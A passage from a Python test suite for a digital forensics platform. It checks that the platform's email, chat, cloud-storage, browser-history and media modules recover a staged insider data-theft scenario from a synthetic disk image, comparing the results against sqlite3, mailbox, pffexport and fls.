                'https://intranet.corp.example/', 'https://mail.example.com/', 'https://mail.example.com/login',
                'https://onedrive.live.com/?cid=a1b2c3d4e5f60718', 'https://pastebin.example.com', 'https://tracker.example.com/open.gif?u=alice',
                'https://www.bing.com/search?q=securedelete+wipe+free+space', 'https://intranet.corp.example/hr/payroll',
                'https://tools.example.org/securedelete', 'https://filetransfer.example.net/upload'}
CHROME = f'{ALICE}/Local/Google/Chrome/User Data/Default'
FIREFOX = f'{ALICE}/Roaming/Mozilla/Firefox/Profiles/k2x8.default-release'
SKYPE_DB = f'{ALICE}/Roaming/Skype/alice.example/main.db'
ONEDRIVE_DB = f'{ALICE}/Local/Microsoft/OneDrive/settings/Personal/SyncEngineDatabase.db'
PRIVATE_EMAIL = 'alice.private@mailbox.example'
CHROME_DELETED = [  # (address, title, last visit, search term)
    ('https://www.google.com/search?q=how+to+permanently+delete+files+from+usb', 'how to permanently delete files from usb - Google Search',
     utc(2026, 9, 1, 14, 16, 2), 'how to permanently delete files from usb'),
    ('https://filetransfer.example.net/d/7Hq2xK', 'Your file is ready - Anonymous File Upload', utc(2026, 9, 1, 14, 22, 18), None),
    ('https://www.google.com/search?q=clear+chrome+history+for+one+day', 'clear chrome history for one day - Google Search',
     utc(2026, 9, 1, 14, 38, 51), 'clear chrome history for one day'),
]
FIREFOX_DELETED = ('https://www.bing.com/search?q=securedelete+wipe+free+space', 'securedelete wipe free space - Search', utc(2026, 9, 1, 14, 17, 25))
SKYPE_TEXTS = ['Offer letter attached. Start date is flexible.', 'offer-letter.pdf', 'Thanks. I can bring the payroll & client lists when I move.',
               "Good. Don't use work email for it ;)"]


def _local(path, name=None):
    p = Path(tempfile.mkdtemp()) / (name or path.rsplit('/', 1)[-1])
    p.write_bytes(icat_bytes(path))
    return p


@section('12m Email (Thunderbird folders vs Python\'s mailbox module on the files in the image)')
def t_email():
    import email as email_lib
    import email.policy
    import email.utils
    import mailbox
    inv, A, E = C['INVESTIGATOR'], C['A'], C['E']
    db = mongo()
    mods = get(f'/api/evidence/{E}', inv).json['modules']
    check('the email module ran with the standard analysis', (mods.get('email') or {}).get('status') == 'COMPLETED', mods.get('email'))
    stores = [s for s in get(f'/api/forensics/email/stores?case_id={A}', inv).json['data'] if s['evidence_id'] == E]
    truth = {}
    for folder in ('INBOX', 'Sent'):
        raw = icat_bytes(f'{TB}/{folder}')
        p = Path(tempfile.mkdtemp()) / folder
        p.write_bytes(raw)
        box = mailbox.mbox(str(p), create=False)
        truth[folder] = [email_lib.message_from_bytes(box.get_bytes(k), policy=email.policy.default) for k in box.keys()]
        box.close()
        st = next((s for s in stores if s['path'] == f'{TB}/{folder}'), {})
        check(f'{folder}: read as a Thunderbird folder with its SHA-256 and the {len(truth[folder])} messages Python\'s mailbox module finds',
              st.get('format') == 'THUNDERBIRD' and st.get('client') == 'Thunderbird' and st.get('user') == 'alice'
              and st.get('sha256') == hashlib.sha256(raw).hexdigest() and st.get('messages') == len(truth[folder]) == 2, st)
    check('the .msf summary files are not read as mailboxes', len(stores) == 2, [s['path'] for s in stores])
    msgs = get(f'/api/forensics/email/messages?case_id={A}&evidence_id={E}&limit=500', inv).json['data']
    got = {(m['folder'], m['subject']): m for m in msgs}
    want = {(f'imap.corp.example/{f}', str(w['Subject'])): w for f, ws in truth.items() for w in ws}
    addrs = lambda v: [a for _, a in email.utils.getaddresses([str(v)])]
    bad = [k for k, w in want.items() if k not in got or got[k]['from_address'] != email.utils.parseaddr(str(w['From']))[1]
           or [x['address'] for x in got[k]['to']] != addrs(w['To'])
           or iso(got[k]['sent']) != email.utils.parsedate_to_datetime(str(w['Date'])).astimezone(timezone.utc)]
    check('every message with the sender, recipients and sent time (the Date header, in UTC) the mailbox module gives',
          set(got) == set(want) and not bad, (sorted(set(got) ^ set(want)), bad))

    b = got.get(('imap.corp.example/Sent', 'backup'), {})
    check(f'the payroll export sent to {PRIVATE_EMAIL} at 14:20:31 UTC, with one attachment',
          b.get('direction') == 'sent' and iso(b.get('time')) == utc(2026, 9, 1, 14, 20, 31) and b.get('attachment_count') == 1
          and [x['address'] for x in b.get('to', [])] == [PRIVATE_EMAIL], b)
    d = get(f"/api/forensics/email/messages/{b.get('_id')}", inv).json or {}
    att = (d.get('attachments') or [{}])[0]
    page = get(f"/api/forensics/members/{att.get('entry_id')}/content?length=65536", inv).json if att.get('entry_id') else None
    check('the attachment is the payroll export byte for byte (opened through its file-index entry)',
          att.get('name') == 'payroll-export.csv' and att.get('sha256') == hashlib.sha256(PAYROLL).hexdigest()
          and page and base64.b64decode(page['data_b64']) == PAYROLL and page['eof'], (att, page and page.get('size')))
    m = db.fs_entries.find_one({'evidence_id': E, 'path': att.get('entry_path')}) or {}
    check('...is an email-attachment member, hashed, typed and matched to the payroll hash set like the copies on the disk',
          (m.get('container') or {}).get('kind') == 'email' and m.get('sha256') == hashlib.sha256(PAYROLL).hexdigest()
          and m.get('mime') == 'text/csv' and m.get('hash_status') == 'NOTABLE' and 'Payroll exports' in [s['name'] for s in m.get('hash_sets') or []],
          {k: m.get(k) for k in ('path', 'container', 'sha256', 'mime', 'hash_status', 'hash_sets')})
    check('the message body, transport headers and recipients come with the message; the HTML body only from its own endpoint',
          (d.get('body_text') or '').strip() == 'for home' and 'Message-ID: <7f3c2a10' in (d.get('headers') or '') and d.get('body_html') is None, d.get('body_text'))
    r = got.get(('imap.corp.example/Sent', 'Re: the list'), {})
    sent = next((s for s in stores if s['path'].endswith('/Sent')), {})
    check('the reply alice deleted is still in the Sent file, marked deleted (X-Mozilla-Status 0009)',
          r.get('deleted') is True and r.get('flags') == ['read', 'deleted'] and sent.get('deleted_messages') == 1, r)
    h = got.get(('imap.corp.example/INBOX', 'Payroll export ready for review'), {})
    hh = get(f"/api/forensics/email/messages/{h.get('_id')}/html", inv).json or {}
    logo = base64.b64encode(next(a for a in truth['INBOX'][1].walk() if a.get_content_type() == 'image/png').get_payload(decode=True)).decode()
    check('HTML body: the inline logo (cid:) comes back as a data: URI and the remote tracking picture is counted, not fetched',
          h.get('has_html') and 'cid:' not in hh.get('html', '') and f'data:image/png;base64,{logo}' in hh.get('html', '')
          and hh.get('remote_references') == 1, {k: hh.get(k) for k in ('remote_references', 'truncated')})
    check('opening messages is recorded in the audit log', db.audit_logs.count_documents({'action': 'EMAIL_VIEWED', 'resource_id': E}) >= 2)
    q = lambda extra: get(f'/api/forensics/email/messages?case_id={A}&evidence_id={E}{extra}', inv).json['total']
    check('filters: 2 sent, 1 deleted, 1 with attachments (an inline picture is not one), 3 mention "payroll", 2 with dmitri',
          (q('&direction=sent'), q('&deleted=true'), q('&attachments=true'), q('&search=payroll'), q('&address=dmitri')) == (2, 1, 1, 3, 2),
          (q('&direction=sent'), q('&deleted=true'), q('&attachments=true'), q('&search=payroll'), q('&address=dmitri')))
    ev = [e for e in get(f'/api/forensics/timeline?case_id={A}&type=EMAIL_SENT,EMAIL_RECEIVED&limit=50', inv).json['data'] if e['evidence_id'] == E]
    check('the timeline has each message; the export\'s says where it went and what was attached',
          len(ev) == 4 and any(e['type'] == 'EMAIL_SENT' and iso(e['timestamp']) == utc(2026, 9, 1, 14, 20, 31) and PRIVATE_EMAIL in e['description']
                               and 'payroll-export.csv' in e['description'] for e in ev), [e['description'] for e in ev])
    check('bad requests are refused (400) and another investigator sees nothing (404)',
          get(f'/api/forensics/email/messages?case_id={A}&direction=sideways', inv).status == 400
          and get(f'/api/forensics/email/messages/{"0" * 24}', inv).status == 404
          and get(f'/api/forensics/email/stores?case_id={A}', C['INV2']).status == 404
          and get(f"/api/forensics/email/messages/{b.get('_id')}", C['INV2']).status == 404
          and get(f"/api/forensics/email/messages/{h.get('_id')}/html", C['INV2']).status == 404)
    s = get(f'/api/forensics/search?case_id={A}&q=dmitri', inv).json
    check('keyword search finds the messages and the Skype chat with dmitri', s['totals'].get('email') == 2 and s['totals'].get('chat', 0) >= 1, s['totals'])
    t = post('/api/tags', inv, {'case_id': A, 'item_type': 'EMAIL', 'item_id': b.get('_id'), 'label': 'EVIDENCE', 'note': 'payroll sent home'}).json
    j = _analyse(inv, E, {'modules': ['email']})
    tag = next((x for x in get(f'/api/tags?case_id={A}', inv).json['data'] if x['tag_id'] == t.get('tag_id')), {})
    check('a tagged email follows the message when the module re-runs (its attachments are re-matched too)',
          j['status'] == 'COMPLETED' and j['result']['summary'].get('tags', {}).get('unresolved') == 0
          and tag.get('item_id') != b.get('_id') and (tag.get('snapshot') or {}).get('title') == 'backup'
          and {'email', 'hash_match', 'yara'} <= set(j['result']['summary'].get('plan', [])), (j['result']['summary'].get('plan'), tag))
    req('DELETE', f"/api/tags/{t.get('tag_id')}", inv)


@section('12n Chat and cloud storage (Skype and OneDrive vs sqlite3, Dropbox vs json, chat apps vs fls, on the files in the image)')
def t_chat_cloud():
    inv, A, E = C['INVESTIGATOR'], C['A'], C['E']
    mods = get(f'/api/evidence/{E}', inv).json['modules']
    check('the chat and cloud module ran with the standard analysis', (mods.get('chat_cloud') or {}).get('status') == 'COMPLETED', mods.get('chat_cloud'))
    rows = lambda t, extra='': get(f'/api/forensics/chat-cloud?case_id={A}&evidence_id={E}&type={t}&limit=1000{extra}', inv).json['data']
    con = sqlite3.connect(_local(SKYPE_DB))
    truth = [(datetime.fromtimestamp(t, tz=timezone.utc), a) for t, a in con.execute('SELECT timestamp, author FROM Messages ORDER BY timestamp')]
    tr = con.execute('SELECT type, partner_handle, status, filename, filepath, filesize, starttime FROM Transfers').fetchall()
    call = con.execute('SELECT begin_timestamp, duration, is_incoming FROM Calls').fetchall()
    con.close()
    msgs = rows('CHAT_MESSAGE')
    check('Skype: every message sqlite3 reads, in order, with its author and text (markup and entities decoded)',
          [(iso(m['time']), m['author']) for m in msgs] == truth and [m['text'] for m in msgs] == SKYPE_TEXTS
          and all(m['conversation'] == 'Dmitri K' and m['account'] == 'alice.example' and m['user'] == 'alice' for m in msgs),
          [(m['time'], m['author'], m['text']) for m in msgs])
    manifest = json.loads(IMG.with_suffix('.manifest.json').read_text())
    size = next(x['size'] for x in manifest['files'] if x['path'] == '/Users/alice/Documents/offer-letter.pdf')
    t = (rows('CHAT_FILE_TRANSFER') or [{}])[0]
    check('Skype file transfer: offer-letter.pdf received from dmitri.k.rival and saved to Documents (the size of the file on the disk)',
          tr == [(1, 'dmitri.k.rival', 8, 'offer-letter.pdf', 'C:\\Users\\alice\\Documents\\offer-letter.pdf', str(size), int(utc(2025, 3, 12, 18, 5, 2).timestamp()))]
          and (t.get('direction'), t.get('status'), t.get('file_name'), t.get('size'), iso(t.get('started'))) == ('received', 'completed', 'offer-letter.pdf', size, utc(2025, 3, 12, 18, 5, 2)), t)
    c = (rows('CHAT_CALL') or [{}])[0]
    check('Skype call: incoming, 12 min 34 s, with dmitri.k.rival', call == [(int(utc(2025, 3, 12, 18, 15).timestamp()), 754, 1)]
          and (iso(c.get('time')), c.get('duration_seconds'), c.get('incoming'), c.get('members')) == (utc(2025, 3, 12, 18, 15), 754, True, ['dmitri.k.rival']), c)
    contact = (rows('CHAT_CONTACT') or [{}])[0]
    acct = (rows('CHAT_ACCOUNT') or [{}])[0]
    check('Skype account and contact', acct.get('handle') == 'alice.example' and acct.get('emails') == PRIVATE_EMAIL
          and contact.get('handle') == 'dmitri.k.rival' and contact.get('emails') == 'dmitri.k@rivalcorp.example', (acct, contact))
    conv = get(f'/api/forensics/chat-cloud/conversations?case_id={A}&evidence_id={E}', inv).json['data']
    check('conversations: one, with 4 messages', [(x['conversation'], x['messages']) for x in conv] == [('Dmitri K', 4)], conv)

    apps = {a['app']: a for a in rows('CHAT_APP')}
    def fls_under(prefix):
        fs = [x for x in C['TRUTH'] if x['path'].startswith(prefix + '/') and not x['virtual'] and x['mode'][:1] != 'd']
        return len(fs), sum(x['size'] for x in fs)
    wa = apps.get('WhatsApp', {})
    wa_dir = f'{ALICE}/Local/Packages/5319275A.WhatsAppDesktop_cv1g1gvanyjgm'
    tg_dir = f'{ALICE}/Roaming/Telegram Desktop'
    check('WhatsApp and Telegram are found and described, not read (encrypted): files and size as fls lists them, newest change',
          (wa.get('files'), wa.get('size')) == fls_under(wa_dir) == (2, 10240) and wa.get('path') == wa_dir and not wa.get('parsed')
          and 'encrypted' in (wa.get('reason') or '') and iso(wa.get('last_change')) == utc(2026, 9, 1, 14, 24, 50)
          and (apps.get('Telegram Desktop', {}).get('files'), apps.get('Telegram Desktop', {}).get('size')) == fls_under(tg_dir) == (2, 5120)
          and apps.get('Skype', {}).get('parsed') is True and apps['Skype'].get('messages') == 4, apps)

    accounts = {a['provider']: a for a in rows('CLOUD_ACCOUNT')}
    info = json.loads(icat_bytes(f'{ALICE}/Local/Dropbox/info.json'))
    check('cloud accounts: OneDrive (personal, synced to C:\\Users\\alice\\OneDrive, 2 files) and Dropbox (its folder from info.json)',
          accounts.get('OneDrive', {}).get('sync_folder') == 'C:\\Users\\alice\\OneDrive' and accounts['OneDrive'].get('files') == 2
          and accounts.get('Dropbox', {}).get('sync_folder') == info['personal']['path'] == 'C:\\Users\\alice\\Dropbox', accounts)
    con = sqlite3.connect(_local(ONEDRIVE_DB))
    od = {r[0]: r[1:] for r in con.execute('SELECT fileName, size, lastChange, localHashDigest FROM od_ClientFile_Records')}
    con.close()
    files = {f['path']: f for f in rows('CLOUD_FILE', '&files_only=true')}
    pay = files.get('/Backup/payroll-export.csv', {})
    check('OneDrive: every synced file sqlite3 reads, with size, change time and SHA-1; the payroll export went to Backup at 14:26:10',
          {p.rsplit('/', 1)[-1] for p in files} == set(od)
          and all((f['size'], int(iso(f['modified']).timestamp()), f['hash'].upper()) == od[f['name']] for f in files.values())
          and pay.get('hash') == hashlib.sha1(PAYROLL).hexdigest() and iso(pay.get('modified')) == utc(2026, 9, 1, 14, 26, 10), files)
    db = mongo()
    same = {x['path'] for x in db.fs_entries.find({'evidence_id': E, 'sha1': hashlib.sha1(PAYROLL).hexdigest()}, {'path': 1})}
    check("the synced payroll export is linked to the same content on this disk: the renamed copy, the Recycle Bin, the archive and the email",
          {x['path'] for x in pay.get('same_content', [])} == same and '/Users/alice/Pictures/holiday.jpg' in same
          and any(p.startswith(f'{TB}/Sent!/') for p in same), (pay.get('same_content'), same))
    ev = [e for e in get(f'/api/forensics/timeline?case_id={A}&type=CLOUD_FILE,CHAT_MESSAGE,CHAT_CALL,CHAT_FILE_TRANSFER,CHAT_APP&limit=100', inv).json['data']
          if e['evidence_id'] == E]
    check('timeline: the OneDrive upload, the Skype messages, call and transfer, and the WhatsApp data change',
          any(e['type'] == 'CLOUD_FILE' and iso(e['timestamp']) == utc(2026, 9, 1, 14, 26, 10) and '/Backup/payroll-export.csv' in e['description'] for e in ev)
          and sum(e['type'] == 'CHAT_MESSAGE' for e in ev) == 4 and sum(e['type'] in ('CHAT_CALL', 'CHAT_FILE_TRANSFER') for e in ev) == 2
          and any(e['type'] == 'CHAT_APP' and 'WhatsApp' in e['description'] for e in ev), [e['description'] for e in ev])
    check('an unknown type is 400; another investigator gets 404',
          get(f'/api/forensics/chat-cloud?case_id={A}&type=NOPE', inv).status == 400
          and get(f'/api/forensics/chat-cloud?case_id={A}&type=CHAT_MESSAGE', C['INV2']).status == 404
          and get(f'/api/forensics/chat-cloud/conversations?case_id={A}', C['INV2']).status == 404)
    t = post('/api/tags', inv, {'case_id': A, 'item_type': 'CHAT_CLOUD', 'item_id': pay.get('_id'), 'label': 'NOTABLE'}).json
    check('a synced file can be tagged', (t.get('snapshot') or {}).get('title') == '/Backup/payroll-export.csv'
          and (t.get('snapshot') or {}).get('detail') == 'Cloud storage file (OneDrive) · alice', t)
    req('DELETE', f"/api/tags/{t.get('tag_id')}", inv)


@section('12o Browser searches, cookies, bookmarks, form history, logins and deleted history (vs sqlite3 and json on the files in the image, and their bytes)')
def t_browser_depth():
    inv, A, E = C['INVESTIGATOR'], C['A'], C['E']
    mods = get(f'/api/evidence/{E}', inv).json['modules']
    check('the browser module ran with the standard analysis', (mods.get('browser_depth') or {}).get('status') == 'COMPLETED', mods.get('browser_depth'))
    rows = lambda k, extra='': [r for r in get(f'/api/forensics/browser?case_id={A}&kind={k}&limit=1000{extra}', inv).json['data'] if r['evidence_id'] == E]
    hist = _local(f'{CHROME}/History')
    con = sqlite3.connect(f'file:{hist}?mode=ro&immutable=1', uri=True)
    live = {u for (u,) in con.execute('SELECT url FROM urls')}
    terms = con.execute('SELECT term FROM keyword_search_terms').fetchall()
    con.close()
    raw = hist.read_bytes()
    wal = icat_bytes(f'{FIREFOX}/places.sqlite-wal')
    rec = rows('BROWSER_RECOVERED')
    got = {(r['browser'], r['url'], r['title'], iso(r['last_visit_time'])) for r in rec}
    want = {('Chrome', u, t, w) for u, t, w, _ in CHROME_DELETED} | {('Firefox', *FIREFOX_DELETED)}
    check('deleted history: exactly the 3 Chrome rows and the Firefox row alice deleted, with their titles and visit times',
          got == want and not any(u in live for u, *_ in CHROME_DELETED), got ^ want)
    where = {r['url']: r for r in rec}
    check('Chrome\'s rows from free space in History, the Firefox row from an older page copy in places.sqlite-wal; each at the byte offset given',
          all(where[u]['recovered_from'] == 'free space' and where[u]['file'] == 'database' and 0 <= raw.find(u.encode(), where[u]['file_offset']) - where[u]['file_offset'] < 32
              for u, *_ in CHROME_DELETED)
          and where[FIREFOX_DELETED[0]]['recovered_from'] == 'WAL frame' and where[FIREFOX_DELETED[0]]['wal_frame'] >= 1
          and 0 <= wal.find(FIREFOX_DELETED[0].encode(), where[FIREFOX_DELETED[0]]['file_offset']) - where[FIREFOX_DELETED[0]]['file_offset'] < 32,
          {u: (r['recovered_from'], r['file_offset'], r.get('wal_frame')) for u, r in where.items()})
    check('the last row deleted kept its row ID (7); the others lost it to the freeblock headers SQLite wrote over them',
          where[CHROME_DELETED[2][0]]['row_id'] == 7 and where[CHROME_DELETED[0][0]]['row_id'] is None, {u: r['row_id'] for u, r in where.items()})
    s = rows('BROWSER_SEARCH')
    got = {(r['browser'], r['term'], bool(r.get('recovered')), r['source_table']) for r in s}
    check('searches: the live Chrome search term (as sqlite3 reads it), and the searches in the deleted rows of both browsers',
          got == {('Chrome', 'how to wipe usb drive', False, 'keyword_search_terms'), ('Chrome', CHROME_DELETED[0][3], True, 'urls'),
                  ('Chrome', CHROME_DELETED[2][3], True, 'urls'), ('Firefox', 'securedelete wipe free space', True, 'moz_places')}
          and terms == [('how to wipe usb drive',)] and len(rows('BROWSER_SEARCH', '&recovered=true')) == 3, got)
    con = sqlite3.connect(_local(f'{CHROME}/Network/Cookies', 'Cookies'))
    ck = {(h, n, w) for h, n, w in con.execute('SELECT host_key, name, creation_utc FROM cookies')}
    con.close()
    cookies = rows('BROWSER_COOKIE')
    check('cookies: every Chrome cookie sqlite3 reads (Network/Cookies), values left encrypted',
          {(c['host'], c['name'], int((iso(c['created']).timestamp() + 11_644_473_600) * 1_000_000)) for c in cookies} == ck and len(ck) == 3
          and all(c['value_encrypted'] and c.get('value') is None for c in cookies), cookies)
    marks = json.loads(icat_bytes(f'{CHROME}/Bookmarks'))
    def urls(node):
        return ([node['url']] if node.get('type') == 'url' else []) + [u for ch in node.get('children', []) for u in urls(ch)]
    chrome_marks = {u for root in marks['roots'].values() for u in urls(root)}
    bm = rows('BROWSER_BOOKMARK')
    check('bookmarks: the Chrome bookmarks in the JSON file (in their folders) and Firefox\'s toolbar bookmark',
          {b['url'] for b in bm if b['browser'] == 'Chrome'} == chrome_marks and len(chrome_marks) == 3
          and any(b['folder'] == 'Bookmarks bar/tools' and b['url'] == 'https://tools.example.org/securedelete' and iso(b['added']) == utc(2026, 9, 1, 10, 4, 41) for b in bm)
          and [(b['folder'], b['title']) for b in bm if b['browser'] == 'Firefox'] == [('Bookmarks toolbar', 'Paste')], bm)
    af = rows('BROWSER_AUTOFILL')
    check('form history: what alice typed (her private address 4 times in Chrome, the Firefox search box), and a saved card without its number',
          any(a['browser'] == 'Chrome' and a['value'] == PRIVATE_EMAIL and a['times_used'] == 4 and iso(a['last_used']) == utc(2026, 9, 1, 14, 19, 4) for a in af)
          and any(a['browser'] == 'Firefox' and a['kind'] == 'search bar' and a['value'] == 'securedelete wipe free space' for a in af)
          and any(a['kind'] == 'saved card' and 'number encrypted' in a['value'] for a in af) and len(af) == 6, af)
    con = sqlite3.connect(_local(f'{CHROME}/Login Data'))
    lt = {(o, u or None) for o, u in con.execute('SELECT origin_url, username_value FROM logins')}
    con.close()
    lg = rows('BROWSER_LOGIN')
    body = get(f'/api/forensics/browser?case_id={A}&kind=BROWSER_LOGIN', inv).body
    check('saved logins: every site and user name sqlite3 reads (and Firefox\'s, user name encrypted); no password, encrypted or not, ever leaves the server',
          {(x['site'], x['username']) for x in lg if x['browser'] == 'Chrome'} == lt and len(lt) == 3
          and [x['username_encrypted'] for x in lg if x['browser'] == 'Firefox'] == [True]
          and b'password_value' not in body and b'v10' not in body and b'encryptedPassword' not in body, lg)
    ev = [e for e in get(f'/api/forensics/timeline?case_id={A}&type=BROWSER_SEARCH,BROWSER_RECOVERED,BROWSER_LOGIN&limit=100', inv).json['data']
          if e['evidence_id'] == E]
    check('timeline: the live search, the 4 deleted visits at their times, and the login saved on the upload site',
          any(e['type'] == 'BROWSER_SEARCH' and 'how to wipe usb drive' in e['description'] and iso(e['timestamp']) == utc(2026, 9, 1, 10, 2) for e in ev)
          and sorted(iso(e['timestamp']) for e in ev if e['type'] == 'BROWSER_RECOVERED') == sorted([w for _, _, w, _ in CHROME_DELETED] + [FIREFOX_DELETED[2]])
          and any(e['type'] == 'BROWSER_LOGIN' and 'filetransfer.example.net' in e['description'] for e in ev), [e['description'] for e in ev])
    check('another investigator gets 404 for the new kinds', get(f'/api/forensics/browser?case_id={A}&kind=BROWSER_RECOVERED', C['INV2']).status == 404)


@section('12p Real mailboxes, chat and browser databases (Plaso samples on a disk: the PST vs pffexport, the rest vs sqlite3)')
def t_comms_samples():
    if not C.get('SAMPLES_EV'):
        note('real-sample disk', 'section 12j did not upload the samples disk')
        return
    inv, ev = C['INVESTIGATOR'], C['SAMPLES_EV']
    j = _analyse(inv, ev, {'modules': ['email', 'browser_depth', 'chat_cloud']})
    counts = j.get('result', {}).get('summary', {}).get('counts', {})
    check('the modules read the real files on the samples disk', j['status'] == 'COMPLETED' and counts.get('email_messages') == 543, counts)
    db = mongo()
    pst = SAMPLES / 'plaso' / 'nromanoff@stark-research-labs.com.pst'
    out = Path(tempfile.mkdtemp()) / 'pst'
    sh('pffexport', '-q', '-f', 'text', '-t', str(out), str(pst))
    top = out.with_name('pst.export') / 'Top of Outlook data file'
    item = re.compile(r'^(Message|Contact|Appointment|Meeting|Task|Note|Activity|Distribution list)\d{5}$')
    truth = {}
    for d in top.rglob('*'):
        if d.is_dir() and item.match(d.name):
            folder = d.parent.relative_to(top).as_posix()
            truth[folder] = truth.get(folder, 0) + 1
    store = db.forensic_artifacts.find_one({'evidence_id': ev, 'type': 'EMAIL_STORE'}) or {}
    ours = {f['name']: f['messages'] for f in store.get('folders', [])}
    check(f'PST: every folder holds the items pffexport exports ({sum(truth.values())} in all), and the store\'s SHA-256 is the sample\'s',
          ours == truth and store.get('messages') == 543 and store.get('sha256') == file_sha256(pst) and store.get('format') == 'PST', (ours, truth))
    msgs = list(db.email_messages.find({'evidence_id': ev, 'folder': 'Inbox'}, {'subject': 1, 'received': 1, 'number': 1}))
    want = []
    for d in sorted((top / 'Inbox').iterdir()):
        if d.is_dir() and d.name.startswith('Message'):
            hdr = (d / 'OutlookHeaders.txt').read_text('utf-8', 'replace')
            subj = re.search(r'^Subject:\t+(.*)$', hdr, re.M)
            deliv = re.search(r'^Delivery time:\t+(.*) UTC$', hdr, re.M)
            want.append((subj.group(1) if subj else None,
                         datetime.strptime(deliv.group(1).split('.')[0], '%b %d, %Y %H:%M:%S').replace(tzinfo=timezone.utc) if deliv else None))
    got = [(m.get('subject'), m.get('received').replace(microsecond=0) if m.get('received') else None) for m in sorted(msgs, key=lambda m: m['number'])]
    check(f'PST Inbox: the {len(want)} messages in order, with the subject and delivery time pffexport gives',
          got == want and len(want) == 527, [x for x in zip(got, want) if x[0] != x[1]][:3])
    atts = list((top).rglob('Attachments/*'))
    members = list(db.fs_entries.find({'evidence_id': ev, 'container.kind': 'email'}, {'name': 1, 'sha256': 1}))
    check(f'PST attachments: the {len(atts)} files pffexport writes, byte for byte (by SHA-256), as file-index members',
          sorted(file_sha256(a) for a in atts) == sorted(m['sha256'] for m in members) and len(atts) == 6
          and {m['name'] for m in members} == {a.name.split('_', 1)[1] for a in atts}, (len(atts), len(members)))
    sky = SAMPLES / 'plaso' / 'sqlite' / 'skype_main.db'
    con = sqlite3.connect(f'file:{sky}?mode=ro&immutable=1', uri=True)
    n = {t: con.execute(f'SELECT count(*) FROM {t}').fetchone()[0] for t in ('Messages', 'Calls', 'Transfers', 'Contacts', 'Accounts')}
    times = sorted(datetime.fromtimestamp(t, tz=timezone.utc) for (t,) in con.execute('SELECT timestamp FROM Messages'))
    files = sorted(f for (f,) in con.execute('SELECT filename FROM Transfers'))
    con.close()
    of = lambda t: list(db.forensic_artifacts.find({'evidence_id': ev, 'type': t}))
    check(f'Skype (Plaso\'s main.db): {n["Messages"]} messages, {n["Calls"]} call, {n["Transfers"]} transfers, {n["Contacts"]} contacts as sqlite3 counts, at the same times',
          (len(of('CHAT_MESSAGE')), len(of('CHAT_CALL')), len(of('CHAT_FILE_TRANSFER')), len(of('CHAT_CONTACT')), len(of('CHAT_ACCOUNT')))
          == (n['Messages'], n['Calls'], n['Transfers'], n['Contacts'], n['Accounts'])
          and sorted(m['time'] for m in of('CHAT_MESSAGE')) == times and sorted(t['file_name'] for t in of('CHAT_FILE_TRANSFER')) == files, n)
    hist = SAMPLES / 'plaso' / 'chrome' / 'History'
    con = sqlite3.connect(f'file:{hist}?mode=ro&immutable=1', uri=True)
    kst = sorted((t, (datetime(1601, 1, 1, tzinfo=timezone.utc) + timedelta(microseconds=v)).replace(microsecond=0)) for t, v in con.execute(
        'SELECT k.term, u.last_visit_time FROM keyword_search_terms k JOIN urls u ON u.id = k.url_id'))
    con.close()
    srch = sorted((s['term'], s['time'].replace(microsecond=0)) for s in of('BROWSER_SEARCH') if s['source_table'] == 'keyword_search_terms')
    check('Chrome (an older History): the search terms sqlite3 reads (funny cats...), with the time of their visit',
          srch == kst and len(kst) == 3 and 'funny cats' in {t for t, _ in kst}, (srch, kst))
    wd = SAMPLES / 'plaso' / 'chrome' / 'Web Data'
    con = sqlite3.connect(f'file:{wd}?mode=ro&immutable=1', uri=True)
    fill = sorted(con.execute('SELECT name, value, count FROM autofill').fetchall())
    con.close()
    check('Chrome Web Data: the form entries sqlite3 reads', sorted((a['field'], a['value'], a['times_used']) for a in of('BROWSER_AUTOFILL')) == fill and len(fill) == 3,
          fill)
    ck = SAMPLES / 'plaso' / 'chrome' / 'Cookies-68.0.3440.106'
    con = sqlite3.connect(f'file:{ck}?mode=ro&immutable=1', uri=True)
    cks = sorted(con.execute('SELECT host_key, name FROM cookies').fetchall())
    con.close()
    check('Chrome 68 cookies: the 5 cookies sqlite3 reads', sorted((c['host'], c['name']) for c in of('BROWSER_COOKIE')) == cks and len(cks) == 5, cks)
    pl = SAMPLES / 'plaso' / 'firefox' / 'places.sqlite'
    con = sqlite3.connect(f'file:{pl}?mode=ro&immutable=1', uri=True)
    nb = con.execute('SELECT count(*) FROM moz_bookmarks b JOIN moz_places p ON p.id = b.fk WHERE b.type = 1').fetchone()[0]
    live = {u for (u,) in con.execute('SELECT url FROM moz_places')}
    con.close()
    check(f'Firefox: the {nb} bookmarks sqlite3 joins to their places', len([b for b in of('BROWSER_BOOKMARK') if b['browser'] == 'Firefox']) == nb > 0, nb)
    rec = of('BROWSER_RECOVERED')
    sample_files = {'Default/History': hist, 'Profile 1/History': SAMPLES / 'plaso' / 'chrome' / 'History-59.0.3071.86',
                    'plaso.default/places.sqlite': pl}

    def live_urls(f):
        con = sqlite3.connect(f'file:{f}?mode=ro&immutable=1', uri=True)
        urls_ = {u for (u,) in con.execute(f"SELECT url FROM {'moz_places' if f.name.endswith('places.sqlite') else 'urls'}")}
        con.close()
        return urls_
    bad = []
    for r in rec:
        f = next((v for k, v in sample_files.items() if r['source_path'].endswith(k)), None)
        if not f or r['file'] != 'database' or f.read_bytes().find(r['url'].encode()) < 0 or r['url'] in live_urls(f):
            bad.append((r['source_path'], r['url']))
    check(f'deleted rows found in the real samples ({len(rec)}): each is in the bytes of its file and is not a live row', not bad, bad[:5])
    note('recovered rows in real samples', [(r['browser'], r['url'][:80], r['recovered_from']) for r in rec][:10])


# Phase 10 ground truth: make_artifacts.py's PHOTO_GPS, PHOTO_LOCAL, WHITEBOARD_TEXT, SCAN_LINES and VIDEO.
PHOTO_GPS = '/Users/alice/Pictures/IMG_20260901_101032.jpg'
PHOTO_LOCAL = '/Users/alice/Pictures/IMG_20260830_181500.jpg'
WHITEBOARD = '/Users/alice/Pictures/whiteboard.png'
SCAN_PDF = '/Users/alice/Documents/scan-payment-instruction.pdf'
VIDEO_MP4 = '/Users/alice/Videos/VID_20260901_101800.mp4'


@section('12q Pictures and videos (vs Pillow on the files in the image, ffprobe, and the text drawn on them)')
def t_media():
    from PIL import Image
    inv, A, E = C['INVESTIGATOR'], C['A'], C['E']
    db = mongo()
    mods = get(f'/api/evidence/{E}', inv).json['modules']
    check('the pictures and videos module ran with the standard analysis', (mods.get('media') or {}).get('status') == 'COMPLETED', mods.get('media'))
    items = {x['path']: x for x in get(f'/api/forensics/media?case_id={A}&evidence_id={E}&limit=500', inv).json['data']}
    pictures = {}
    for f in json.loads(IMG.with_suffix('.manifest.json').read_text())['files']:
        try:
            with Image.open(io.BytesIO(icat_bytes(f['path']))) as im:
